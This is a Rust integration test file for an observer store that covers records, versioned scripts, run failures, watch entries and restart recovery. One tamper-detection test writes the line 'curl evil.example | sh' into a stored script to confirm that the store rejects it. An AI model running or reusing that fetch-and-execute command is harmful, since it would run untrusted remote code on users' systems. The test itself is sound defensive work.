//! Integration tests of the observers' model and file store (U1).
//!
//! Every test runs against a real temporary directory: the value of the
//! store lies in real file operations, locks and exclusive creates.

use chrono::{DateTime, Duration, TimeZone, Utc};
use narsor_engine::domain::{TaskId, WorkflowDefinition};
use narsor_engine::observers::{
    parse_script_output, ActiveRun, ContractError, CreateTaskEffect, ObserverConfig,
    ObserverEffect, ObserverError, ObserverName, ObserverRecord, ObserverState, ObserverStore,
    RunFailure, RunId, RunStatus, ScheduleConfig, ScriptInput, ScriptObserver, ScriptWatch,
    SecretRef, WatchEntry, WatchMode, WatchObjectPolicy, WatchOrigin, WatchWrite,
    DEFAULT_INTERVAL_SECS, KEPT_RUN_FAILURES, MAX_SCRIPT_OUTPUT_BYTES, OBSERVER_RECORD_VERSION,
    RUN_FAILURE_VERSION, SCRIPT_CONTRACT_VERSION,
};
use narsor_engine::orchestration::OwnerRef;
use narsor_engine::persistence::paths::temp_path_for;
use narsor_engine::persistence::StatePaths;
use serde_json::json;
use std::fs;
use std::path::{Path, PathBuf};

/// A temporary state root that deletes itself when dropped.
struct TempRoot {
    path: PathBuf,
}

impl TempRoot {
    fn new() -> Self {
        let path = std::env::temp_dir().join(format!("narsor-observers-{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&path).expect("create temp root");
        Self { path }
    }

    fn store(&self) -> ObserverStore {
        ObserverStore::new(StatePaths::new(&self.path))
    }

    fn paths(&self) -> StatePaths {
        StatePaths::new(&self.path)
    }
}

impl Drop for TempRoot {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.path);
    }
}

fn now() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 11, 13, 12, 0, 0).unwrap()
}

fn owner() -> OwnerRef {
    OwnerRef::new("owner")
}

fn name(value: &str) -> ObserverName {
    ObserverName::parse(value).unwrap()
}

/// The catalogue's definition of `triage` version 1, with inputs `ticket`
/// and `summary`.
fn triage_workflow() -> WorkflowDefinition {
    serde_json::from_value(json!({
        "id": "triage",
        "name": "triage",
        "version": 1,
        "inputs": [{"name": "ticket", "required": true}, {"name": "summary"}],
        "states": {},
        "initial_state": "start",
    }))
    .expect("a minimal workflow definition")
}

fn create_task_effect() -> ObserverEffect {
    ObserverEffect::CreateTask(CreateTaskEffect {
        workflow_id: "triage".into(),
        workflow_version: 1,
        workspaces: Default::default(),
        backend_id: Some("local".into()),
        profile: None,
        mapping: [("ticket".to_string(), "key".to_string())]
            .into_iter()
            .collect(),
    })
}

fn jira_config(observer: &str) -> ObserverConfig {
    let mut config = ObserverConfig::new(name(observer), "jira", create_task_effect());
    config.condition = json!({"jql": "project = ABC AND labels = narsor"});
    config.secrets = vec![SecretRef {
        name: "jira-token".into(),
        env: "JIRA_TOKEN".into(),
    }];
    config
}

fn review_config(observer: &str) -> ObserverConfig {
    let mut config = ObserverConfig::new(name(observer), "gitlab", ObserverEffect::DeliverEvent);
    config.watch_mode = WatchMode::WatchList;
    config.watch_objects = WatchObjectPolicy {
        allowed_prefixes: vec!["https://gitlab.example.com/".into()],
        ..WatchObjectPolicy::default()
    };
    config
}

fn create_jira(store: &ObserverStore, observer: &str) -> ObserverRecord {
    store
        .create(
            owner(),
            jira_config(observer),
            Some(&triage_workflow()),
            now(),
        )
        .expect("create observer")
}

fn script_input(record: &ObserverRecord) -> ScriptInput {
    ScriptInput {
        contract_version: SCRIPT_CONTRACT_VERSION,
        observer: ScriptObserver {
            id: record.observer_id.clone(),
            name: record.config.name.clone(),
            source: record.config.source.clone(),
        },
        condition: record.config.condition.clone(),
        state: Some(json!({"cursor": 4})),
        watches: vec![ScriptWatch {
            object: "https://gitlab.example.com/a/-/merge_requests/17".into(),
            task_id: TaskId::parse("task-1").unwrap(),
            event_types: vec!["approved".into()],
            wait_episode: Some("episode-1".into()),
        }],
        first_run: true,
        import_backlog: false,
    }
}

fn active_run(sequence: u64) -> ActiveRun {
    ActiveRun {
        sequence,
        script_version: 1,
        claimed_at: now(),
        deadline: now() + Duration::seconds(360),
        token_digest: "sha256:abc".into(),
        tasks_created: 2,
    }
}

fn failure(record: &ObserverRecord, sequence: u64) -> RunFailure {
    RunFailure {
        record_version: RUN_FAILURE_VERSION,
        observer_id: record.observer_id.clone(),
        sequence,
        script_version: 1,
        claimed_at: now(),
        finished_at: now() + Duration::seconds(5),
        status: RunStatus::Failed,
        exit_code: Some(1),
        error: "the script exited with code 1".into(),
        stdout: Some(String::new()),
        stderr: Some("boom".into()),
    }
}

fn watch(task: &str, step: Option<&str>, object: &str) -> WatchEntry {
    WatchEntry::new(
        TaskId::parse(task).unwrap(),
        step.map(str::to_string),
        object,
        vec!["approved".into()],
        WatchOrigin::Workflow,
        now(),
    )
}

fn invalid_reason(error: ObserverError) -> String {
    match error {
        ObserverError::Invalid { field, reason } => format!("{field}: {reason}"),
        other => panic!("expected a validation refusal, got {other:?}"),
    }
}

// ---------------------------------------------------------------------------
// The record
// ---------------------------------------------------------------------------

#[test]
fn a_new_observer_is_a_draft_without_an_approved_version() {
    let root = TempRoot::new();
    let store = root.store();

    let record = create_jira(&store, "jira-abc");

    assert_eq!(record.state, ObserverState::Draft);
    assert_eq!(record.approved_version, None);
    assert_eq!(record.config.schedule.interval_secs, DEFAULT_INTERVAL_SECS);
    assert_eq!(record.config.task_limit_per_run, 10);
    assert_eq!(record.owner, owner());
    assert_eq!(record.record_version, OBSERVER_RECORD_VERSION);
    assert_eq!(record.next_run_at, None);
    assert_eq!(record.run_due_since, None);
    assert!(record.scripts.is_empty());
    assert_eq!(store.load(&record.observer_id).unwrap(), record);
    assert_eq!(
        store
            .find_by_name("jira-abc")
            .unwrap()
            .map(|r| r.observer_id),
        Some(record.observer_id)
    );
}

#[test]
fn an_interval_under_sixty_seconds_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let mut config = jira_config("jira-abc");
    config.schedule = ScheduleConfig { interval_secs: 30 };

    let error = store
        .create(owner(), config, Some(&triage_workflow()), now())
        .unwrap_err();

    let reason = invalid_reason(error);
    assert!(reason.contains("at least 60 seconds"), "{reason}");
    assert!(store.list().unwrap().is_empty());
}

#[test]
fn a_second_observer_with_the_same_name_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    create_jira(&store, "jira-abc");

    let error = store
        .create(
            owner(),
            jira_config("jira-abc"),
            Some(&triage_workflow()),
            now(),
        )
        .unwrap_err();

    assert!(matches!(error, ObserverError::NameTaken(taken) if taken.as_str() == "jira-abc"));
    assert_eq!(store.list().unwrap().len(), 1);
}

#[test]
fn concurrent_creations_of_one_name_give_one_observer() {
    let root = TempRoot::new();
    let store = root.store();

    let created: Vec<bool> = std::thread::scope(|scope| {
        let handles: Vec<_> = (0..8)
            .map(|_| {
                let store = store.clone();
                scope.spawn(move || {
                    store
                        .create(
                            owner(),
                            jira_config("jira-abc"),
                            Some(&triage_workflow()),
                            now(),
                        )
                        .is_ok()
                })
            })
            .collect();
        handles.into_iter().map(|h| h.join().unwrap()).collect()
    });

    assert_eq!(created.iter().filter(|ok| **ok).count(), 1);
    assert_eq!(store.list().unwrap().len(), 1);
}

#[test]
fn deliver_event_with_watch_mode_all_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let mut config = review_config("gitlab-review");
    config.watch_mode = WatchMode::All;

    let reason = invalid_reason(store.create(owner(), config, None, now()).unwrap_err());

    assert!(reason.contains("watch_list"), "{reason}");
    assert!(store.list().unwrap().is_empty());
}

#[test]
fn a_watch_list_observer_needs_an_allowed_object_prefix() {
    let root = TempRoot::new();
    let store = root.store();
    let mut config = review_config("gitlab-review");
    config.watch_objects.allowed_prefixes.clear();

    let reason = invalid_reason(store.create(owner(), config, None, now()).unwrap_err());

    assert!(reason.contains("allowed object prefix"), "{reason}");
    assert!(store
        .create(owner(), review_config("gitlab-review"), None, now())
        .is_ok());
}

#[test]
fn a_create_task_effect_needs_its_workflow_and_its_mapped_inputs() {
    let root = TempRoot::new();
    let store = root.store();

    let missing = store
        .create(owner(), jira_config("a"), None, now())
        .unwrap_err();
    assert!(matches!(missing, ObserverError::WorkflowNotFound(workflow) if workflow == "triage"));

    let mut config = jira_config("b");
    if let ObserverEffect::CreateTask(effect) = &mut config.effect {
        effect.mapping.insert("priority".into(), "prio".into());
    }
    let reason = invalid_reason(
        store
            .create(owner(), config, Some(&triage_workflow()), now())
            .unwrap_err(),
    );
    assert!(reason.contains("'priority'"), "{reason}");

    let mut config = jira_config("c");
    if let ObserverEffect::CreateTask(effect) = &mut config.effect {
        effect.workflow_version = 2;
    }
    assert!(store
        .create(owner(), config, Some(&triage_workflow()), now())
        .is_err());
    assert!(store.list().unwrap().is_empty());
}

#[test]
fn invalid_secrets_and_conditions_are_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let workflow = triage_workflow();

    let mut config = jira_config("a");
    config.secrets.push(SecretRef {
        name: "other".into(),
        env: "JIRA_TOKEN".into(),
    });
    assert!(invalid_reason(
        store
            .create(owner(), config, Some(&workflow), now())
            .unwrap_err()
    )
    .contains("used twice"));

    let mut config = jira_config("b");
    config.secrets[0].env = "NARSOR_TOKEN".into();
    assert!(invalid_reason(
        store
            .create(owner(), config, Some(&workflow), now())
            .unwrap_err()
    )
    .contains("reserved"));

    let mut config = jira_config("c");
    config.condition = json!("project = ABC");
    assert!(invalid_reason(
        store
            .create(owner(), config, Some(&workflow), now())
            .unwrap_err()
    )
    .contains("JSON object"));

    let mut config = jira_config("d");
    config.task_limit_per_run = 0;
    assert!(store
        .create(owner(), config, Some(&workflow), now())
        .is_err());
}

#[test]
fn an_older_record_without_the_newer_fields_loads_with_defaults() {
    let root = TempRoot::new();
    let store = root.store();
    let observer_id = "obs-0123456789abcdef";
    let path = root.paths().observer_record_file(observer_id);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(
        &path,
        serde_json::to_vec(&json!({
            "record_version": 1,
            "observer_id": observer_id,
            "owner": "owner",
            "created_at": "2026-11-01T00:00:00Z",
            "config": {
                "name": "legacy",
                "source": "jira",
                "effect": {"kind": "create_task", "workflow_id": "triage", "workflow_version": 1},
            },
        }))
        .unwrap(),
    )
    .unwrap();

    let record = store
        .load(&narsor_engine::observers::ObserverId::parse(observer_id).unwrap())
        .unwrap();

    assert_eq!(record.state, ObserverState::Draft);
    assert_eq!(record.config.schedule.interval_secs, DEFAULT_INTERVAL_SECS);
    assert_eq!(record.config.task_limit_per_run, 10);
    assert_eq!(record.config.watch_mode, WatchMode::All);
    assert_eq!(record.config.condition, json!({}));
    assert_eq!(record.config.watch_objects.max_len, 512);
    assert_eq!(record.approved_version, None);
    assert_eq!(record.consecutive_failures, 0);
    assert!(!record.first_run_done);
    assert!(record.scripts.is_empty());
    assert_eq!(store.list().unwrap().len(), 1);
}

#[test]
fn an_unknown_state_from_a_newer_build_reads_as_unrecognized() {
    let state: ObserverState = serde_json::from_value(json!("hibernating")).unwrap();
    assert_eq!(state, ObserverState::Unrecognized);
    let status: RunStatus = serde_json::from_value(json!("vanished")).unwrap();
    assert_eq!(status, RunStatus::Unrecognized);
}

#[test]
fn a_record_from_a_newer_schema_version_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let path = root
        .paths()
        .observer_record_file(record.observer_id.as_str());
    let mut raw: serde_json::Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    raw["record_version"] = json!(OBSERVER_RECORD_VERSION + 1);
    fs::write(&path, serde_json::to_vec(&raw).unwrap()).unwrap();

    assert!(matches!(
        store.load(&record.observer_id),
        Err(ObserverError::UnsupportedRecordVersion { .. })
    ));
}

#[test]
fn a_save_bumps_the_revision_and_needs_the_observers_own_lock() {
    let root = TempRoot::new();
    let store = root.store();
    let mut record = create_jira(&store, "a");
    let other = create_jira(&store, "b");

    {
        let lock = store.lock(&record.observer_id).unwrap();
        record.state = ObserverState::Paused;
        store.save(&lock, &mut record, now()).unwrap();
    }
    let reloaded = store.load(&record.observer_id).unwrap();
    assert_eq!(reloaded.state, ObserverState::Paused);
    assert_eq!(reloaded.revision, 1);
    assert_eq!(reloaded.updated_at, Some(now()));

    let wrong = store.lock(&other.observer_id).unwrap();
    assert!(matches!(
        store.save(&wrong, &mut record, now()),
        Err(ObserverError::LockMismatch { .. })
    ));
}

#[test]
fn a_deleted_observer_frees_its_name_but_never_its_id() {
    let root = TempRoot::new();
    let store = root.store();
    let first = create_jira(&store, "jira-abc");
    store
        .add_script(&first.observer_id, "echo '{}'\n", now())
        .unwrap();

    assert!(store.delete(&first.observer_id).unwrap());
    assert!(!store.delete(&first.observer_id).unwrap());
    assert!(matches!(
        store.load(&first.observer_id),
        Err(ObserverError::NotFound(_))
    ));
    assert!(!root
        .paths()
        .observer_dir(first.observer_id.as_str())
        .exists());

    let second = create_jira(&store, "jira-abc");
    assert_ne!(second.observer_id, first.observer_id);
}

// ---------------------------------------------------------------------------
// Script versions
// ---------------------------------------------------------------------------

#[test]
fn two_script_saves_give_versions_one_and_two_and_leave_one_unchanged() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let id = &record.observer_id;

    assert_eq!(store.add_script(id, "echo one\n", now()).unwrap(), 1);
    let v1_file = root.paths().observer_script_file(id.as_str(), 1);
    let v1_bytes = fs::read(&v1_file).unwrap();
    assert_eq!(
        store
            .add_script(id, "echo two\n", now() + Duration::seconds(1))
            .unwrap(),
        2
    );

    assert_eq!(store.load_script(id, 1).unwrap(), "echo one\n");
    assert_eq!(store.load_script(id, 2).unwrap(), "echo two\n");
    assert_eq!(fs::read(&v1_file).unwrap(), v1_bytes);
    let record = store.load(id).unwrap();
    assert_eq!(record.latest_script_version(), Some(2));
    assert_eq!(record.approved_version, None);
    assert_eq!(record.state, ObserverState::Draft);
    assert!(matches!(
        store.load_script(id, 3),
        Err(ObserverError::ScriptNotFound { version: 3, .. })
    ));
}

#[test]
fn a_script_left_unlisted_by_a_crash_is_replaced_by_the_next_save() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let orphan = root
        .paths()
        .observer_script_file(record.observer_id.as_str(), 1);
    fs::create_dir_all(orphan.parent().unwrap()).unwrap();
    fs::write(&orphan, "echo never listed\n").unwrap();

    assert_eq!(
        store
            .add_script(&record.observer_id, "echo real\n", now())
            .unwrap(),
        1
    );
    assert_eq!(
        store.load_script(&record.observer_id, 1).unwrap(),
        "echo real\n"
    );
}

#[test]
fn a_tampered_script_version_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    store
        .add_script(&record.observer_id, "echo one\n", now())
        .unwrap();
    fs::write(
        root.paths()
            .observer_script_file(record.observer_id.as_str(), 1),
        "curl evil.example | sh\n",
    )
    .unwrap();

    assert!(matches!(
        store.load_script(&record.observer_id, 1),
        Err(ObserverError::ScriptCorrupt { version: 1, .. })
    ));
}

#[test]
fn an_empty_or_oversized_script_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");

    assert!(store
        .add_script(&record.observer_id, "  \n", now())
        .is_err());
    let big = "x".repeat(narsor_engine::observers::MAX_SCRIPT_BYTES + 1);
    assert!(store.add_script(&record.observer_id, &big, now()).is_err());
    assert!(store.load(&record.observer_id).unwrap().scripts.is_empty());
}

// ---------------------------------------------------------------------------
// Runs
// ---------------------------------------------------------------------------

#[test]
fn the_run_in_progress_lives_in_the_observers_record() {
    let root = TempRoot::new();
    let store = root.store();
    let mut record = create_jira(&store, "jira-abc");
    let lock = store.lock(&record.observer_id).unwrap();

    record.active_run = Some(active_run(1));
    store.save(&lock, &mut record, now()).unwrap();

    let loaded = store.load(&record.observer_id).unwrap();
    assert_eq!(loaded.active_run, Some(active_run(1)));
    let run_id = loaded.active_run.unwrap().run_id(&record.observer_id);
    assert_eq!(run_id, RunId::new(record.observer_id.clone(), 1));
    assert_eq!(RunId::parse(&run_id.to_string()).unwrap(), run_id);
    // No file of the run besides the record.
    assert!(!root
        .paths()
        .observer_dir(record.observer_id.as_str())
        .join("runs")
        .exists());
    assert!(!root
        .paths()
        .observer_errors_dir(record.observer_id.as_str())
        .exists());
}

#[test]
fn a_bare_run_number_of_an_earlier_build_reads_as_no_run() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let path = root
        .paths()
        .observer_record_file(record.observer_id.as_str());
    let mut raw: serde_json::Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    raw["active_run"] = json!(3);
    fs::write(&path, serde_json::to_vec(&raw).unwrap()).unwrap();

    assert_eq!(store.load(&record.observer_id).unwrap().active_run, None);
}

#[test]
fn errors_are_kept_newest_first_up_to_the_limit() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let lock = store.lock(&record.observer_id).unwrap();
    let written = KEPT_RUN_FAILURES as u64 + 5;

    for sequence in 1..=written {
        store
            .record_failure(&lock, &failure(&record, sequence))
            .unwrap();
    }

    let kept = store.list_failures(&record.observer_id).unwrap();
    assert_eq!(kept.len(), KEPT_RUN_FAILURES);
    assert_eq!(kept[0], failure(&record, written));
    assert_eq!(kept.last().unwrap().sequence, 6);
    assert!(!root
        .paths()
        .observer_error_file(record.observer_id.as_str(), 5)
        .exists());
    // The same run's error again replaces it.
    let mut again = failure(&record, written);
    again.status = RunStatus::Lost;
    store.record_failure(&lock, &again).unwrap();
    let kept = store.list_failures(&record.observer_id).unwrap();
    assert_eq!(kept.len(), KEPT_RUN_FAILURES);
    assert_eq!(kept[0].status, RunStatus::Lost);
}

#[test]
fn an_error_needs_the_observers_own_lock() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "a");
    let other = create_jira(&store, "b");
    let lock = store.lock(&other.observer_id).unwrap();

    assert!(matches!(
        store.record_failure(&lock, &failure(&record, 1)),
        Err(ObserverError::LockMismatch { .. })
    ));
    assert!(store.list_failures(&record.observer_id).unwrap().is_empty());
}

#[test]
fn the_lenient_listing_skips_unreadable_records_and_the_strict_one_refuses_them() {
    // D7.
    let root = TempRoot::new();
    let store = root.store();
    let corrupt = create_jira(&store, "corrupt");
    let newer = create_jira(&store, "newer");
    let healthy = create_jira(&store, "healthy");
    fs::write(
        root.paths()
            .observer_record_file(corrupt.observer_id.as_str()),
        b"{ not json",
    )
    .unwrap();
    let path = root
        .paths()
        .observer_record_file(newer.observer_id.as_str());
    let mut raw: serde_json::Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    raw["record_version"] = json!(OBSERVER_RECORD_VERSION + 1);
    fs::write(&path, serde_json::to_vec(&raw).unwrap()).unwrap();

    assert_eq!(store.list_readable().unwrap(), vec![healthy]);
    assert!(store.list().is_err());
}

// ---------------------------------------------------------------------------
// Watch entries
// ---------------------------------------------------------------------------

#[test]
fn a_watch_entry_exists_once_per_task_step_and_object() {
    let root = TempRoot::new();
    let store = root.store();
    let record = store
        .create(owner(), review_config("gitlab-review"), None, now())
        .unwrap();
    let lock = store.lock(&record.observer_id).unwrap();
    let object = "https://gitlab.example.com/a/-/merge_requests/17";
    record.config.watch_objects.check(object).unwrap();
    assert!(record
        .config
        .watch_objects
        .check("https://gitlab.example.com.evil.org/x")
        .is_err());

    let entry = watch("task-1", Some("await_review"), object);
    assert_eq!(
        store.create_watch(&lock, &entry).unwrap(),
        WatchWrite::Created
    );
    // The review loop suspends the same step again.
    let mut again = watch("task-1", Some("await_review"), object);
    again.created_at = now() + Duration::seconds(60);
    assert_eq!(
        store.create_watch(&lock, &again).unwrap(),
        WatchWrite::Exists(entry.clone())
    );
    let owners_entry = WatchEntry::new(
        TaskId::parse("task-1").unwrap(),
        None,
        object,
        vec!["approved".into()],
        WatchOrigin::Operator,
        now(),
    );
    assert_eq!(
        store.create_watch(&lock, &owners_entry).unwrap(),
        WatchWrite::Created
    );
    assert_eq!(store.list_watches(&record.observer_id).unwrap().len(), 2);

    assert!(store.remove_watch(&lock, &entry.entry_id).unwrap());
    assert!(!store.remove_watch(&lock, &entry.entry_id).unwrap());
    assert!(store.remove_watch(&lock, "../observer").is_err());
    assert_eq!(
        store.list_watches(&record.observer_id).unwrap(),
        vec![owners_entry]
    );
}

#[test]
fn a_watch_entry_without_event_types_or_with_a_forged_id_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let record = store
        .create(owner(), review_config("gitlab-review"), None, now())
        .unwrap();
    let lock = store.lock(&record.observer_id).unwrap();

    let mut entry = watch("task-1", None, "https://gitlab.example.com/a/1");
    entry.event_types.clear();
    assert!(store.create_watch(&lock, &entry).is_err());

    let mut entry = watch("task-1", None, "https://gitlab.example.com/a/1");
    entry.entry_id = "0".repeat(64);
    assert!(store.create_watch(&lock, &entry).is_err());
    assert!(store.list_watches(&record.observer_id).unwrap().is_empty());
}

// ---------------------------------------------------------------------------
// The script contract
// ---------------------------------------------------------------------------

#[test]
fn script_output_over_the_limit_or_not_json_breaks_the_contract() {
    let oversized = format!(r#"{{"state": "{}"}}"#, "x".repeat(MAX_SCRIPT_OUTPUT_BYTES));
    assert!(matches!(
        parse_script_output(oversized.as_bytes()),
        Err(ContractError::TooLarge { .. })
    ));
    assert!(matches!(
        parse_script_output(b"found 3 issues"),
        Err(ContractError::Malformed(_))
    ));
    assert!(matches!(
        parse_script_output(br#"{"state": {"cursor": 5}} {"state": {}}"#),
        Err(ContractError::Malformed(_))
    ));

    let output = parse_script_output(
        br#"{"state": {"cursor": 5}, "closed_watches": ["https://gitlab.example.com/a/-/merge_requests/17"]}"#,
    )
    .unwrap();
    assert_eq!(output.state, json!({"cursor": 5}));
    assert_eq!(output.closed_watches.len(), 1);
}

#[test]
fn the_script_input_is_one_json_document_with_the_watch_episode() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let input = script_input(&record);

    let value: serde_json::Value = serde_json::from_slice(&input.to_json_bytes()).unwrap();

    assert_eq!(value["contract_version"], json!(1));
    assert_eq!(value["observer"]["name"], json!("jira-abc"));
    assert_eq!(value["state"], json!({"cursor": 4}));
    assert_eq!(value["watches"][0]["wait_episode"], json!("episode-1"));
    assert_eq!(value["first_run"], json!(true));
}

// ---------------------------------------------------------------------------
// Restart
// ---------------------------------------------------------------------------

#[test]
fn records_scripts_errors_and_watches_survive_a_restart() {
    let root = TempRoot::new();
    let (jira, review, error, entry) = {
        let store = root.store();
        let jira = create_jira(&store, "jira-abc");
        store
            .add_script(&jira.observer_id, "echo one\n", now())
            .unwrap();
        let review = store
            .create(owner(), review_config("gitlab-review"), None, now())
            .unwrap();
        let lock = store.lock(&jira.observer_id).unwrap();
        let mut active = store.load(&jira.observer_id).unwrap();
        active.active_run = Some(active_run(2));
        store.save(&lock, &mut active, now()).unwrap();
        let error = failure(&jira, 1);
        store.record_failure(&lock, &error).unwrap();
        drop(lock);
        let lock = store.lock(&review.observer_id).unwrap();
        let entry = watch("task-1", Some("await"), "https://gitlab.example.com/a/1");
        store.create_watch(&lock, &entry).unwrap();
        let jira = store.load(&jira.observer_id).unwrap();
        (jira, review, error, entry)
    };
    // Interrupted writes leave temporary files; a fresh store sweeps them.
    let stray = temp_path_for(&root.paths().observer_record_file(jira.observer_id.as_str()));
    fs::write(&stray, b"{").unwrap();

    let store = root.store();

    assert_eq!(store.cleanup_orphaned_temp_files().unwrap(), vec![stray]);
    assert_eq!(store.list().unwrap(), vec![review.clone(), jira.clone()]);
    assert_eq!(
        store.load_script(&jira.observer_id, 1).unwrap(),
        "echo one\n"
    );
    assert_eq!(store.list_failures(&jira.observer_id).unwrap(), vec![error]);
    assert_eq!(jira.active_run, Some(active_run(2)));
    assert_eq!(
        store.list_watches(&review.observer_id).unwrap(),
        vec![entry]
    );
}

#[test]
fn a_directory_without_a_record_is_not_an_observer() {
    let root = TempRoot::new();
    let store = root.store();
    let dir: &Path = &root.paths().observer_dir("obs-orphan");
    fs::create_dir_all(dir.join("scripts")).unwrap();
    fs::write(root.paths().observers_dir().join("stray.txt"), b"x").unwrap();

    assert!(store.list().unwrap().is_empty());
    let orphan = narsor_engine::observers::ObserverId::parse("obs-orphan").unwrap();
    assert!(matches!(
        store.lock(&orphan),
        Err(ObserverError::NotFound(_))
    ));
}
